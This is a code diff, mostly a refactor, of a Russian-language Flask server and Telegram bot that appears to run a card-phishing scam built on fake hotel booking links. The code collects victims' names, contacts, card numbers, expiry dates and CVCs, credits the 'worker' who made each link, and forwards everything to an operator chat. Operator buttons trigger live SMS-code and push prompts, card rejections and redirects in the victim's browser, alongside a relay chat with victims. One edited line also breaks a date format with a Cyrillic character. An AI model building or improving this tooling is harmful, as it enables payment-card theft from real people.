@@ -41,6 +41,9 @@ bot = Bot(token=BOT_TOKEN)
 storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
 
+# Кэш ответов оператора: chat_id оператора -> user_id клиента
+reply_sessions = {}
+
 # SSE сервер
 app = Flask(__name__)
 sse_clients = {}
@@ -85,9 +88,7 @@ def sse(user_id):
                         while sse_clients[user_id]:
                             command = sse_clients[user_id].pop(0)
                             yield f"data: {json.dumps(command)}\n\n"
-                
                 time.sleep(0.05)
-                
         except GeneratorExit:
             with sse_lock:
                 if user_id in sse_clients:
@@ -116,24 +117,18 @@ def check_card():
     try:
         data = request.json
         card_number = data.get('card_number', '').replace(' ', '')
-        
         if not card_number:
             return jsonify({'error': 'Missing card_number'}), 400
-        
-        # Проверяем карту в БД
         is_bound = check_card_in_db(card_number)
-        
         response = jsonify({
             'status': 'success',
             'is_bound': is_bound,
             'card_status': 'ПРИВЯЗАННАЯ КАРТА' if is_bound else 'НЕПРИВЯЗАННАЯ КАРТА'
         })
-        
         origin = request.headers.get('Origin')
         if origin in ALLOWED_ORIGINS:
             response.headers['Access-Control-Allow-Origin'] = origin
         return response
-        
     except Exception as e:
         logger.error(f"❌ Ошибка проверки карты: {e}")
         response = jsonify({'error': str(e)})
@@ -157,42 +152,28 @@ def send_to_telegram():
     try:
         data = request.json
         message_text = data.get('message')
-        # Используем ADMIN_CHAT_ID из .env, а не из запроса
         chat_id = ADMIN_CHAT_ID
         parse_mode = data.get('parse_mode', 'HTML')
         reply_markup = data.get('reply_markup')
-        
         if not message_text:
             return jsonify({'error': 'Missing message'}), 400
-        
-        # Отправляем сообщение через бота
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            'chat_id': chat_id,
-            'text': message_text,
-            'parse_mode': parse_mode
-        }
-        
+        payload = {'chat_id': chat_id, 'text': message_text, 'parse_mode': parse_mode}
         if reply_markup:
             payload['reply_markup'] = reply_markup
-        
         response = requests.post(url, json=payload, timeout=10)
         result = response.json()
-        
         if result.get('ok'):
             logger.info("✅ Сообщение отправлено в Telegram через сервер")
             response_data = {'status': 'success', 'message_id': result['result']['message_id']}
         else:
             logger.error(f"❌ Ошибка отправки в Telegram: {result}")
             response_data = {'status': 'error', 'error': result.get('description')}
-        
-        # CORS headers
         resp = jsonify(response_data)
         origin = request.headers.get('Origin')
         if origin in ALLOWED_ORIGINS:
             resp.headers['Access-Control-Allow-Origin'] = origin
         return resp
-        
     except Exception as e:
         logger.error(f"💥 Ошибка отправки в Telegram: {e}")
         response = jsonify({'error': str(e)})
@@ -218,29 +199,24 @@ def send_command():
         user_id = data.get('user_id')
         action = data.get('action')
         payment_id = data.get('payment_id')
-        
         if not user_id or not action:
             return {'error': 'Missing user_id or action'}, 400
-            
         command_data = {
             'type': 'bot_command',
             'action': action,
             'payment_id': payment_id,
             'timestamp': datetime.datetime.now().isoformat()
         }
-        
         with sse_lock:
             if user_id not in sse_clients:
                 sse_clients[user_id] = []
             sse_clients[user_id].append(command_data)
-            
         logger.info(f"✅ Команда отправлена {user_id}: {action}")
         response = jsonify({'status': 'success'})
         origin = request.headers.get('Origin')
         if origin in ALLOWED_ORIGINS:
             response.headers['Access-Control-Allow-Origin'] = origin
         return response
-        
     except Exception as e:
         logger.error(f"❌ Ошибка отправки команды: {e}")
         response = jsonify({'error': str(e)})
@@ -255,7 +231,6 @@ def health():
     with sse_lock:
         users_count = len(sse_clients)
         total_commands = sum(len(commands) for commands in sse_clients.values())
-    
     response = jsonify({
         'status': 'running',
         'users_count': users_count,
@@ -273,68 +248,52 @@ def get_link_data(link_code):
     """Получает данные ссылки по её коду"""
     try:
         logger.info(f"🔍 Поиск ссылки с кодом: {link_code}")
-        
         conn = get_db_connection()
         if conn is None:
             logger.error("❌ Ошибка подключения к БД")
             return jsonify({'error': 'Database connection failed'}), 500
-            
         cursor = conn.cursor()
         cursor.execute('''
             SELECT link_name, price, country_city, images 
             FROM booking_links 
             WHERE link_code = %s
         ''', (link_code,))
-        
         result = cursor.fetchone()
         conn.close()
-        
         if result:
             link_name, price, country_city, images_json = result
-            logger.info(f"✅ Найдена ссылка: {link_name}, цена: {price}")
-            
-            # Обрабатываем изображения
             images = []
             if images_json:
                 try:
-                    # Если это JSON строка - парсим
                     if isinstance(images_json, str):
                         images = json.loads(images_json)
                     else:
                         images = images_json
                 except Exception as e:
                     logger.error(f"❌ Ошибка парсинга images: {e}")
-                    # Если не получается распарсить, используем как есть
                     images = [images_json] if images_json else []
-            
-            # Убедимся что images это список
             if not isinstance(images, list):
                 images = [images] if images else []
-            
-            response_data = {
+            response = jsonify({
                 'link_name': link_name,
                 'price': int(price) if price else 450,
                 'country_city': country_city or 'Польша, Варшава',
                 'images': images,
                 'description': 'Просторный номер премиум-класса с панорамным видом на город. В номере есть king-size кровать, рабочая зона, современная ванная комната с джакузи. Идеально подходит для романтического отдыха или деловой поездки.'
-            }
-            
-            logger.info(f"📦 Отправляем данные: {response_data}")
-            
-            response = jsonify(response_data)
-            
+            })
         else:
-            logger.warning(f"❌ Ссылка не найдена: {link_code}")
             response = jsonify({'error': 'Link not found'}), 404
-        
-        # CORS headers
         origin = request.headers.get('Origin')
         if origin in ALLOWED_ORIGINS:
-            response.headers['Access-Control-Allow-Origin'] = origin
-        response.headers['Access-Control-Allow-Credentials'] = 'true'
-        
+            if isinstance(response, tuple):
+                resp, code = response
+                resp.headers['Access-Control-Allow-Origin'] = origin
+                resp.headers['Access-Control-Allow-Credentials'] = 'true'
+                return resp, code
+            else:
+                response.headers['Access-Control-Allow-Origin'] = origin
+                response.headers['Access-Control-Allow-Credentials'] = 'true'
         return response
-            
     except Exception as e:
         logger.error(f"💥 Критическая ошибка получения данных ссылки: {e}")
         return jsonify({'error': f'Internal server error: {str(e)}'}), 500
@@ -346,7 +305,6 @@ def save_chat_link_mapping(chat_user_id, link_code):
     conn = get_db_connection()
     if conn is None:
         return False
-        
     cursor = conn.cursor()
     try:
         cursor.execute('''
@@ -355,7 +313,6 @@ def save_chat_link_mapping(chat_user_id, link_code):
         ON CONFLICT (chat_user_id) 
         DO UPDATE SET link_code = EXCLUDED.link_code
         ''', (chat_user_id, link_code))
-        
         conn.commit()
         logger.info(f"✅ Связь сохранена: {chat_user_id} -> {link_code}")
         return True
@@ -370,14 +327,9 @@ def get_link_code_by_chat_user(chat_user_id):
     conn = get_db_connection()
     if conn is None:
         return None
-        
     cursor = conn.cursor()
     try:
-        cursor.execute('''
-        SELECT link_code FROM chat_link_mapping 
-        WHERE chat_user_id = %s
-        ''', (chat_user_id,))
-        
+        cursor.execute('SELECT link_code FROM chat_link_mapping WHERE chat_user_id = %s', (chat_user_id,))
         result = cursor.fetchone()
         return result[0] if result else None
     except Exception as e:
@@ -387,25 +339,15 @@ def get_link_code_by_chat_user(chat_user_id):
         conn.close()
 
 def get_link_creator_info(chat_user_id):
-    """Находит создателя ссылки по user_id чата"""
+    """Находит создателя ссылки по user_id чата; возвращает @username или 'ID: ...'"""
     try:
-        # 1. Находим код ссылки по user_id чата
         link_code = get_link_code_by_chat_user(chat_user_id)
-        
         if not link_code:
-            logger.warning(f"❌ Не найдена ссылка для chat_user_id: {chat_user_id}")
             return f"ID: {chat_user_id}"
-        
-        logger.info(f"🔍 Найден link_code: {link_code} для chat_user_id: {chat_user_id}")
-        
-        # 2. Находим создателя ссылки по link_code
         conn = get_db_connection()
         if conn is None:
             return f"ID: {chat_user_id}"
-            
         cursor = conn.cursor()
-        
-        # Ищем создателя ссылки
         cursor.execute('''
             SELECT bl.user_id, a.username 
             FROM booking_links bl
@@ -413,29 +355,17 @@ def get_link_creator_info(chat_user_id):
             WHERE bl.link_code = %s
             LIMIT 1
         ''', (link_code,))
-        
         result = cursor.fetchone()
         conn.close()
-        
         if result:
-            creator_user_id = result[0]
-            creator_username = result[1]
-            
+            creator_user_id, creator_username = result
             if creator_username:
-                # Форматируем username
                 if not creator_username.startswith('@'):
                     creator_username = f"@{creator_username}"
-                logger.info(f"✅ Найден создатель: {creator_username}")
                 return creator_username
-            else:
-                logger.info(f"ℹ️ Создатель найден по ID: {creator_user_id}")
-                return f"ID: {creator_user_id}"
-        else:
-            logger.warning(f"❌ Создатель не найден для link_code: {link_code}")
-            return f"ID: {chat_user_id}"
-        
-    except Exception as e:
-        logger.error(f"❌ Ошибка поиска создателя: {e}")
+            return f"ID: {creator_user_id}"
+        return f"ID: {chat_user_id}"
+    except Exception:
         return f"ID: {chat_user_id}"
 
 def get_sms_reply_button(user_id):
@@ -451,20 +381,15 @@ def send_chat_message():
     """Клиент отправляет сообщение оператору"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'}), 200
-        
     try:
         data = request.json
         user_id = data.get('user_id')
         message = data.get('message')
-        
         if not user_id or not message:
             return jsonify({'error': 'Missing user_id or message'}), 400
-        
-        # Сохраняем сообщение в БД
         conn = get_db_connection()
         if conn is None:
             return jsonify({'error': 'Database connection failed'}), 500
-            
         cursor = conn.cursor()
         cursor.execute(
             'INSERT INTO chat_messages (user_id, message, sender) VALUES (%s, %s, %s)',
@@ -472,43 +397,29 @@ def send_chat_message():
         )
         conn.commit()
         conn.close()
-        
-        # НАХОДИМ КТО СОЗДАЛ ССЫЛКУ ПО USER_ID КЛИЕНТА
         creator_username = get_link_creator_info(user_id)
-        logger.info(f"👤 Создатель ссылки: {creator_username} для клиента: {user_id}")
-
-        # Отправляем сообщение в отдельный чат для SMS С КНОПКОЙ ОТВЕТА
         telegram_message = f"""💬 НОВОЕ СООБЩЕНИЕ
 
 👤 От: {creator_username}
 💬 Текст:
 {message}"""
-
-        # Используем существующую функцию отправки в Telegram
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {
-            'chat_id': -1003473975732,  # ← ОТДЕЛЬНЫЙ ЧАТ ДЛЯ SMS
+            'chat_id': -1003473975732,  # чат для SMS
             'text': telegram_message,
             'parse_mode': 'HTML',
             'reply_markup': get_sms_reply_button(user_id)
         }
-        
-        # ОТПРАВЛЯЕМ СООБЩЕНИЕ!
         response = requests.post(url, json=payload, timeout=10)
-        
         if response.status_code == 200:
-            logger.info(f"📤 SMS отправлено в чат с кнопкой ответа")
+            logger.info("📤 SMS отправлено в чат с кнопкой ответа")
         else:
             logger.error(f"❌ Ошибка отправки SMS: {response.text}")
-        
-        logger.info(f"💬 Сообщение от {creator_username}: {message}")
-        
-        response = jsonify({'status': 'success'})
+        resp = jsonify({'status': 'success'})
         origin = request.headers.get('Origin')
         if origin in ALLOWED_ORIGINS:
-            response.headers['Access-Control-Allow-Origin'] = origin
-        return response
-        
+            resp.headers['Access-Control-Allow-Origin'] = origin
+        return resp
     except Exception as e:
         logger.error(f"❌ Ошибка отправки сообщения чата: {e}")
         return jsonify({'error': str(e)}), 500
@@ -520,13 +431,11 @@ def chat_history(user_id):
         conn = get_db_connection()
         if conn is None:
             return jsonify({'error': 'Database connection failed'}), 500
-            
         cursor = conn.cursor()
         cursor.execute(
             'SELECT message, sender, created_at FROM chat_messages WHERE user_id = %s ORDER BY created_at ASC',
             (user_id,)
         )
-        
         messages = []
         for row in cursor.fetchall():
             messages.append({
@@ -534,15 +443,12 @@ def chat_history(user_id):
                 'sender': row[1],
                 'time': row[2].isoformat() if row[2] else None
             })
-        
         conn.close()
-        
         response = jsonify({'messages': messages})
         origin = request.headers.get('Origin')
         if origin in ALLOWED_ORIGINS:
             response.headers['Access-Control-Allow-Origin'] = origin
         return response
-        
     except Exception as e:
         logger.error(f"❌ Ошибка получения истории чата: {e}")
         return jsonify({'error': str(e)}), 500
@@ -552,20 +458,15 @@ def operator_reply():
     """Оператор отправляет сообщение клиенту через SSE"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'}), 200
-        
     try:
         data = request.json
         user_id = data.get('user_id')
         message = data.get('message')
-        
         if not user_id or not message:
             return jsonify({'error': 'Missing user_id or message'}), 400
-        
-        # Сохраняем сообщение в БД
         conn = get_db_connection()
         if conn is None:
             return jsonify({'error': 'Database connection failed'}), 500
-            
         cursor = conn.cursor()
         cursor.execute(
             'INSERT INTO chat_messages (user_id, message, sender) VALUES (%s, %s, %s)',
@@ -573,28 +474,17 @@ def operator_reply():
         )
         conn.commit()
         conn.close()
-        
-        # Отправляем клиенту через SSE (используем существующий механизм)
         command_data = {
             'type': 'chat_message',
             'action': 'operator_reply',
             'message': message,
             'timestamp': datetime.datetime.now().isoformat()
         }
-        
         with sse_lock:
             if user_id not in sse_clients:
                 sse_clients[user_id] = []
             sse_clients[user_id].append(command_data)
-        
-        logger.info(f"💬 Ответ оператора клиенту {user_id}: {message}")
-        
-        response = jsonify({'status': 'success'})
-        origin = request.headers.get('Origin')
-        if origin in ALLOWED_ORIGINS:
-            response.headers['Access-Control-Allow-Origin'] = origin
-        return response
-        
+        return jsonify({'status': 'success'})
     except Exception as e:
         logger.error(f"❌ Ошибка отправки ответа оператора: {e}")
         return jsonify({'error': str(e)}), 500
@@ -604,27 +494,23 @@ def save_chat_mapping():
     """Сохраняет связь между user_id чата и кодом ссылки"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'}), 200
-        
     try:
         data = request.json
         chat_user_id = data.get('chat_user_id')
         link_code = data.get('link_code')
-        
         if not chat_user_id or not link_code:
             return jsonify({'error': 'Missing chat_user_id or link_code'}), 400
-        
         success = save_chat_link_mapping(chat_user_id, link_code)
-        
-        if success:
-            response = jsonify({'status': 'success'})
-        else:
-            response = jsonify({'error': 'Failed to save mapping'}), 500
-            
+        response = jsonify({'status': 'success'}) if success else (jsonify({'error': 'Failed to save mapping'}), 500)
         origin = request.headers.get('Origin')
         if origin in ALLOWED_ORIGINS:
-            response.headers['Access-Control-Allow-Origin'] = origin
+            if isinstance(response, tuple):
+                resp, code = response
+                resp.headers['Access-Control-Allow-Origin'] = origin
+                return resp, code
+            else:
+                response.headers['Access-Control-Allow-Origin'] = origin
         return response
-        
     except Exception as e:
         logger.error(f"❌ Ошибка сохранения связи чата: {e}")
         return jsonify({'error': str(e)}), 500
@@ -662,9 +548,7 @@ def init_db():
     if conn is None:
         logger.error("❌ Не удалось подключиться к БД для инициализации")
         return
-        
     cursor = conn.cursor()
-    
     try:
         cursor.execute('''
         CREATE TABLE IF NOT EXISTS applications (
@@ -678,7 +562,6 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
         ''')
-        
         cursor.execute('''
         CREATE TABLE IF NOT EXISTS payments (
             id SERIAL PRIMARY KEY,
@@ -687,8 +570,6 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
         ''')
-        
-        # НОВАЯ ТАБЛИЦА ДЛЯ КАРТ
         cursor.execute('''
         CREATE TABLE IF NOT EXISTS cards (
             id SERIAL PRIMARY KEY,
@@ -697,8 +578,6 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
         ''')
-        
-        # НОВАЯ ТАБЛИЦА ДЛЯ ССЫЛОК БРОНИРОВАНИЯ
         cursor.execute('''
         CREATE TABLE IF NOT EXISTS booking_links (
             id SERIAL PRIMARY KEY,
@@ -711,8 +590,6 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
         ''')
-        
-        # ★★★ НОВАЯ ТАБЛИЦА ДЛЯ ЧАТА ПОДДЕРЖКИ ★★★
         cursor.execute('''
         CREATE TABLE IF NOT EXISTS chat_messages (
             id SERIAL PRIMARY KEY,
@@ -722,8 +599,6 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
         ''')
-        
-        # ★★★ НОВАЯ ТАБЛИЦА ДЛЯ СВЯЗИ ЧАТА И ССЫЛКИ ★★★
         cursor.execute('''
         CREATE TABLE IF NOT EXISTS chat_link_mapping (
             id SERIAL PRIMARY KEY,
@@ -732,7 +607,6 @@ def init_db():
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
         ''')
-        
         conn.commit()
         logger.info("✅ Таблицы БД созданы/проверены + добавлена таблица связи чата")
     except Exception as e:
@@ -784,7 +658,6 @@ def check_card_in_db(card_number):
     conn = get_db_connection()
     if conn is None:
         return False
-        
     cursor = conn.cursor()
     try:
         cursor.execute('SELECT id FROM cards WHERE card_number = %s', (card_number,))
@@ -801,7 +674,6 @@ def save_card_to_db(card_number):
     conn = get_db_connection()
     if conn is None:
         return False
-        
     cursor = conn.cursor()
     try:
         cursor.execute('INSERT INTO cards (card_number) VALUES (%s) ON CONFLICT (card_number) DO NOTHING', (card_number,))
@@ -817,6 +689,8 @@ def save_card_to_db(card_number):
 def extract_card_number(text):
     """Извлекает номер карты из текста сообщения"""
     try:
+        if not text:
+            return None
         lines = text.split('\n')
         for line in lines:
             if 'Номер:' in line:
@@ -827,7 +701,7 @@ def extract_card_number(text):
         return None
 
 # Инлайн кнопки для платежей
-def get_payment_buttons(payment_id, user_id="user123", card_number=None):
+def get_payment_buttons(payment_id, user_id="user", card_number=None):
     buttons = [
         [
             InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms:{payment_id}:{user_id}"),
@@ -841,7 +715,6 @@ def get_payment_buttons(payment_id, user_id="user123", card_number=None):
             InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind:{payment_id}:{user_id}")
         ]
     ]
-    
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 # Инлайн кнопки для заявок
@@ -873,14 +746,12 @@ def save_booking_link(user_id, link_name, price, location, images, link_code):
     conn = get_db_connection()
     if conn is None:
         return False
-        
     cursor = conn.cursor()
     try:
         cursor.execute('''
         INSERT INTO booking_links (user_id, link_name, price, country_city, images, link_code)
         VALUES (%s, %s, %s, %s, %s, %s)
         ''', (str(user_id), link_name, price, location, json.dumps(images), link_code))
-        
         conn.commit()
         logger.info(f"✅ Ссылка создана: {link_code} для пользователя {user_id}")
         return True
@@ -895,7 +766,6 @@ def get_user_links(user_id):
     conn = get_db_connection()
     if conn is None:
         return []
-        
     cursor = conn.cursor()
     try:
         cursor.execute('''
@@ -904,7 +774,6 @@ def get_user_links(user_id):
         WHERE user_id = %s 
         ORDER BY created_at DESC
         ''', (str(user_id),))
-        
         links = []
         for row in cursor.fetchall():
             links.append({
@@ -926,7 +795,6 @@ def get_user_status(user_id):
     conn = get_db_connection()
     if conn is None:
         return None
-        
     cursor = conn.cursor()
     try:
         cursor.execute('SELECT status FROM applications WHERE user_id = %s ORDER BY id DESC LIMIT 1', (str(user_id),))
@@ -942,7 +810,6 @@ def get_join_date(user_id):
     conn = get_db_connection()
     if conn is None:
         return datetime.datetime.now().strftime('%d.%m.%Y')
-        
     cursor = conn.cursor()
     try:
         cursor.execute('SELECT created_at FROM applications WHERE user_id = %s AND status = %s', (str(user_id), 'accepted'))
@@ -952,26 +819,21 @@ def get_join_date(user_id):
         return datetime.datetime.now().strftime('%d.%m.%Y')
     except Exception as e:
         logger.error(f"❌ Ошибка получения даты вступления: {e}")
-        return datetime.datetime.now().strftime('%d.%m.%Y')
+        return datetime.datetime.now().strftime('%d.%м.%Y')
     finally:
         conn.close()
 
 def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
-    """СОХРАНЯЕМ ТОЛЬКО СТАТУС, БЕЗ ДАННЫХ КАРТ!"""
+    """Сохраняем только статус, без данных карт"""
     try:
         conn = get_db_connection()
         if conn is None:
             return None
-            
         cursor = conn.cursor()
-        cursor.execute('''
-        INSERT INTO payments (user_id, status)
-        VALUES (%s, 'pending') RETURNING id
-        ''', (str(user_id),))
+        cursor.execute('INSERT INTO payments (user_id, status) VALUES (%s, %s) RETURNING id', (str(user_id), 'pending'))
         payment_id = cursor.fetchone()[0]
         conn.commit()
         conn.close()
-        
         logger.info(f"✅ Платеж #{payment_id} создан (данные карт НЕ сохранены)")
         return payment_id
     except Exception as e:
@@ -983,13 +845,11 @@ def save_application(user_id, username, first_name, time, experience):
         conn = get_db_connection()
         if conn is None:
             return None
-            
         cursor = conn.cursor()
         cursor.execute('''
         INSERT INTO applications (user_id, username, first_name, time, experience, status)
         VALUES (%s, %s, %s, %s, %s, 'pending') RETURNING id
         ''', (str(user_id), username, first_name, time, experience))
-        
         application_id = cursor.fetchone()[0]
         conn.commit()
         conn.close()
@@ -1002,24 +862,17 @@ async def send_sse_command(user_id, action_type, payment_id=None):
     """Отправка команды через SSE сервер"""
     try:
         server_url = "https://roomix-production.up.railway.app"
-        
         response = requests.post(
             f"{server_url}/send_command",
-            json={
-                'user_id': user_id,
-                'action': action_type,
-                'payment_id': payment_id
-            },
+            json={'user_id': user_id, 'action': action_type, 'payment_id': payment_id},
             timeout=5
         )
-        
         if response.status_code == 200:
             logger.info(f"✅ SSE команда отправлена {user_id}: {action_type}")
             return True
         else:
             logger.error(f"❌ Ошибка SSE отправки: {response.status_code}")
             return False
-            
     except Exception as e:
         logger.error(f"💥 Ошибка HTTP запроса: {e}")
         return False
@@ -1028,45 +881,44 @@ async def send_sse_command(user_id, action_type, payment_id=None):
 async def update_payment_status(callback, payment_id, user_id, status_text, action_type, card_number=None):
     """Общая функция для обновления статуса платежа"""
     success = await send_sse_command(user_id, action_type, payment_id)
-    
-    # Если номер карты не передан, извлекаем из сообщения
+
+    original_text = (callback.message.text or "")
+    lines = original_text.split('\n') if original_text else []
+
     if not card_number:
-        card_number = extract_card_number(callback.message.text)
-    
-    # Берем оригинальное сообщение с данными карты
-    original_text = callback.message.text
-    lines = original_text.split('\n')
-    
-    # Проверяем статус карты в БД
-    card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
-    
-    # НАХОДИМ СОЗДАТЕЛЯ ССЫЛКИ
-    creator_info = get_link_creator_info(user_id)
-    
-    # Собираем новое сообщение с красивым форматированием
+        card_number = extract_card_number(original_text)
+
+    if card_number:
+        card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
+    else:
+        card_status = "НЕ ОПРЕДЕЛЕНО"
+
+    creator_info = get_link_creator_info(user_id) or f"ID: {user_id}"
+
     new_text = f"💳 <b>{card_status}</b>\n\n"
-    new_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"  # ← ДОБАВЛЯЕМ ВОРКЕРА
-    
-    # Добавляем клиентские данные
+    new_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"
+
     for line in lines:
         if any(keyword in line for keyword in ['Имя:', 'Фамилия:', 'Email:', 'Телефон:']):
             new_text += line + "\n"
-    
+
     new_text += "\n💳 <b>Карта:</b>\n"
-    
-    # Добавляем данные карты
+
     for line in lines:
         if any(keyword in line for keyword in ['Номер:', 'Срок:', 'CVC:']):
             new_text += line + "\n"
-    
+
     new_text += f"\n{status_text}\n\n"
     new_text += "Выберите действие:"
-    
-    await callback.message.edit_text(
-        new_text,
-        reply_markup=get_payment_buttons(payment_id, user_id, card_number),
-        parse_mode="HTML"
-    )
+
+    try:
+        await callback.message.edit_text(
+            new_text,
+            reply_markup=get_payment_buttons(payment_id, user_id, card_number),
+            parse_mode="HTML"
+        )
+    except Exception as e:
+        logger.error(f"❌ Ошибка обновления сообщения: {e}")
     return success
 
 # ========== ОБРАБОТЧИКИ ПЛАТЕЖЕЙ ==========
@@ -1075,16 +927,8 @@ async def sms_code_handler(callback: types.CallbackQuery):
     parts = callback.data.split(":")
     payment_id = parts[1]
     user_id = parts[2]
-    
-    # Извлекаем номер карты из сообщения
     card_number = extract_card_number(callback.message.text)
-    
-    await update_payment_status(
-        callback, payment_id, user_id, 
-        "📱 <b>Статус: SMS код запрошен</b>", 
-        "sms",
-        card_number
-    )
+    await update_payment_status(callback, payment_id, user_id, "📱 <b>Статус: SMS код запрошен</b>", "sms", card_number)
     await callback.answer("SMS код запрошен")
 
 @dp.callback_query(F.data.startswith("push:"))
@@ -1092,16 +936,8 @@ async def push_handler(callback: types.CallbackQuery):
     parts = callback.data.split(":")
     payment_id = parts[1]
     user_id = parts[2]
-    
-    # Извлекаем номер карты из сообщения
     card_number = extract_card_number(callback.message.text)
-    
-    await update_payment_status(
-        callback, payment_id, user_id,
-        "🔔 <b>Статус: Пуш отправлен</b>", 
-        "push",
-        card_number
-    )
+    await update_payment_status(callback, payment_id, user_id, "🔔 <b>Статус: Пуш отправлен</b>", "push", card_number)
     await callback.answer("Пуш отправлен")
 
 @dp.callback_query(F.data.startswith("wrong_card:"))
@@ -1109,27 +945,16 @@ async def wrong_card_handler(callback: types.CallbackQuery):
     parts = callback.data.split(":")
     payment_id = parts[1]
     user_id = parts[2]
-    
-    # Извлекаем номер карты из сообщения
     card_number = extract_card_number(callback.message.text)
-    
-    await update_payment_status(
-        callback, payment_id, user_id,
-        "❌ <b>Статус: Карта отклонена</b>", 
-        "wrong_card",
-        card_number
-    )
+    await update_payment_status(callback, payment_id, user_id, "❌ <b>Статус: Карта отклонена</b>", "wrong_card", card_number)
     await callback.answer("Карта отклонена")
-    
+
 @dp.callback_query(F.data.startswith("wrong_sms:"))
 async def wrong_sms_handler(callback: types.CallbackQuery):
     parts = callback.data.split(":")
     payment_id = parts[1]
     user_id = parts[2]
-    
-    # Просто отправляем команду SSE БЕЗ изменения сообщения
     success = await send_sse_command(user_id, "wrong_sms", payment_id)
-    
     if success:
         await callback.answer("❌ SMS код отклонен")
     else:
@@ -1140,22 +965,14 @@ async def bind_card_handler(callback: types.CallbackQuery):
     parts = callback.data.split(":")
     payment_id = parts[1]
     user_id = parts[2]
-    
-    # Извлекаем номер карты из сообщения
     card_number = extract_card_number(callback.message.text)
-    
     logger.info(f"🔧 Привязка карты {card_number}, user_id: {user_id}")
-    
-    # Сохраняем карту в БД
-    success = save_card_to_db(card_number)
-    
+    success = save_card_to_db(card_number) if card_number else False
     if success:
-        # ОТПРАВЛЯЕМ КОМАНДУ ДЛЯ РЕДИРЕКТА НА SUCCESS
         await send_sse_command(user_id, "success", payment_id)
-        
         await update_payment_status(
             callback, payment_id, user_id,
-            "✅ <b>Статус: Карта привязана</b>\n📋 <b>Клиент перенаправлен на страницу успеха</b>", 
+            "✅ <b>Статус: Карта привязана</b>\n📋 <b>Клиент перенаправлен на страницу успеха</b>",
             "bind",
             card_number
         )
@@ -1167,7 +984,6 @@ async def bind_card_handler(callback: types.CallbackQuery):
 @dp.message(F.chat.id.in_([ADMIN_CHAT_ID, SUPPORT_CHAT_ID]))
 async def handle_operator_messages(message: types.Message, state: FSMContext):
     logger.info(f"📨 АДМИН: Тип: {message.content_type}, Текст: {message.text}")
-    
     if message.text and ("👤 Клиент:" in message.text or "• Имя:" in message.text):
         logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
         await process_payment_data(message)
@@ -1176,7 +992,6 @@ async def process_payment_data(message: types.Message):
     try:
         lines = message.text.split('\n')
         payment_data = {}
-
         for line in lines:
             line = line.strip()
             if 'Имя:' in line:
@@ -1194,11 +1009,9 @@ async def process_payment_data(message: types.Message):
             elif 'CVC:' in line:
                 payment_data['cvc'] = line.split('CVC:')[1].strip()
 
-        # Проверяем карту в БД
         card_number = payment_data.get('card_number', '')
         is_card_bound = check_card_in_db(card_number)
-        
-        # ЕСЛИ КАРТА УЖЕ ПРИВЯЗАНА - ОТПРАВЛЯЕМ СПЕЦИАЛЬНОЕ СООБЩЕНИЕ
+
         if is_card_bound:
             bound_message = f"""
 🔄 <b>ПОВТОРНАЯ ЗАЯВКА - КАРТА УЖЕ ПРИВЯЗАНА</b>
@@ -1216,18 +1029,12 @@ async def process_payment_data(message: types.Message):
 
 📋 <b>Статус:</b> Заявка поставлена в очередь
 """
-
-            await bot.send_message(
-                chat_id=ADMIN_CHAT_ID,
-                text=bound_message,
-                parse_mode="HTML"
-            )
+            await bot.send_message(chat_id=ADMIN_CHAT_ID, text=bound_message, parse_mode="HTML")
             return
 
-        # НАХОДИМ КТО СОЗДАЛ ССЫЛКУ
-        creator_info = get_link_creator_info(f"temp_{int(time.time())}")
+        # Определение воркера: без temp_ — если нет данных, оставляем неопределенным
+        creator_info = None
 
-        # СОЗДАЕМ ПЛАТЕЖ БЕЗ СОХРАНЕНИЯ ДАННЫХ КАРТ
         payment_id = save_payment(
             user_id=0,
             first_name=payment_data.get('first_name', ''),
@@ -1240,13 +1047,9 @@ async def process_payment_data(message: types.Message):
         )
 
         if payment_id:
-            # Проверяем статус карты В БД СРАЗУ
-            card_number = payment_data.get('card_number', '')
             card_status = "ПРИВЯЗАННАЯ КАРТА" if is_card_bound else "НЕПРИВЯЗАННАЯ КАРТА"
-            
-            # Форматируем сообщение в новом стиле СРАЗУ
             formatted_text = f"💳 <b>{card_status}</b>\n\n"
-            formatted_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"  # ← ДОБАВЛЯЕМ ВОРКЕРА
+            formatted_text += f"👤 <b>Воркер:</b> {creator_info or 'не определен'}\n\n"
             formatted_text += "👤 <b>Клиент:</b>\n"
             formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
             formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
@@ -1258,75 +1061,74 @@ async def process_payment_data(message: types.Message):
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
             formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
             formatted_text += "Выберите действие:"
-            
             await bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=formatted_text,
-                reply_markup=get_payment_buttons(payment_id, "user123", card_number),
+                reply_markup=get_payment_buttons(payment_id, "user", card_number),
                 parse_mode="HTML"
             )
             logger.info(f"✅ Платеж #{payment_id} создан")
-
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
 
